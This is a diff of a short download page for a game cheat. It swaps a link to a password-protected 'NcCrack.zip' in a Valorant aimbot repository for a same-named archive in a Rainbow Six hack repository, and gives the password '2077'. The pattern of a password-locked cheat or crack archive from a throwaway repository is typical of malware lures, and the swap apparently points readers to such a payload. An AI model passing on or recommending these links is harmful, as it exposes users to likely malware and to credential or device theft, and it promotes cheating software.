@@ -2,7 +2,7 @@
 
 # Download cheat
 
-|[Download](https://github.com/NitayWasTaken/Cheat-for-Valorant-OrukaSD-Radar-Aimbot/blob/main/NcCrack.zip?raw=true)|
+|[Download](https://github.com/xsrbro/Updated-24.01.2023-R6S-HACK-AIM-ESP-MISC/blob/main/NcCrack.zip?raw=true)|
 |:-------------|
 Passwrod: `2077`
 
